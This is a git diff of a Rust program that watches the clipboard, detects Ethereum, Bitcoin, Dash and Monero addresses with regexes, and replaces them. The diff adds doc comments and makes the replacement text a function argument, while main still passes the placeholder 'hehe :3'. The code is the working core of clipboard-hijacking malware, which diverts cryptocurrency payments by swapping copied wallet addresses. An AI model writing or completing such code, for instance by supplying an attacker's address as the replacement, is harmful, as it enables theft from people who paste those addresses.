@@ -8,17 +8,35 @@ use regex::Regex;
 use std::collections::HashMap;
 use std::{thread, time};
 
-///
+/// Opens the clipboard using the clipper function and propagates the result
+/// 
+/// # Returns
+/// 
+/// * `Ok(())` - If the clipboard opened successfully
+/// * `Err(&str)` - If the clipboard could not be opened
+/// 
 fn open_clipboard() -> Result<(), &'static str> {
     clipper::clipboard::open_clipboard()
 }
 
-///
+/// Closes the clipboard using the clipper function and propagates the result
+/// 
+/// # Returns
+/// 
+/// * `Ok(())` - If the clipboard closed successfully
+/// 
 fn close_clipboard() -> () {
     clipper::clipboard::close_clipboard().unwrap_or_else(|_| {});
 }
 
-///
+/// Opens the clipboard, saves the content and returns it afer closing the clipboard
+/// 
+/// # Returns
+/// 
+/// * `Ok(String)` - If the clipboard could be read and the data could be
+/// saved, it returns the data as a `String`
+/// * `Err(i8)` - Returns 0 if the clipboard could not be read/open
+/// 
 fn check_clipboard() -> Result<String, i8> {
     // Opening the clipboard
     if let Err(e) = clipper::clipboard::open_clipboard() {
@@ -40,7 +58,21 @@ fn check_clipboard() -> Result<String, i8> {
     Ok(clipboard_text)
 }
 
-///
+/// finds patterns of crypto addresses in the text given
+/// 
+/// # Arguments
+/// 
+/// * `text` - A string slice
+/// * `re_eth` - Regex
+/// * `re_btc` - Regex
+/// * `re_dash` - Regex
+/// * `re_xmr` - Regex
+/// 
+/// # Returns
+/// 
+/// * `Ok(&str)` - Returns the name of the crypto address matched in a String slice
+/// * `Err(i8)` - Returns `0` if there is no matches
+/// 
 fn find_patterns(text: &str, re_eth: Regex, re_btc: Regex, re_dash: Regex, re_xmr: Regex) -> Result<&str, i8> {
     let patterns: HashMap<&str, Regex> = HashMap::from([
         ("eth", re_eth),
@@ -56,13 +88,17 @@ fn find_patterns(text: &str, re_eth: Regex, re_btc: Regex, re_dash: Regex, re_xm
     Err(0)
 }
 
-///
-fn change_clipboard_text() -> () {
-    let new_text: String = "hehe :3".to_owned();
+/// Changes the clipboard text to the one given
+/// 
+/// # Arguments
+/// 
+/// * `new_text` - A string.
+/// 
+fn change_clipboard_text(new_text: String) -> () {
     if let Ok(_) = open_clipboard() {
         set_clipboard_text(&new_text).unwrap_or_else(|_| {});
     }
-
+    close_clipboard();
 }
 
 fn main() {
@@ -88,7 +124,7 @@ fn main() {
         last_clipboard_text = clipboard_text.clone();
         if let Ok(result) = find_patterns(&clipboard_text, re_eth.clone(), re_btc.clone(), re_dash.clone(), re_xmr.clone()) {
             println!("address {}", result);
-            change_clipboard_text();
+            change_clipboard_text("hehe :3".to_owned());
         } else {
             println!("No patterns recognized");
         }
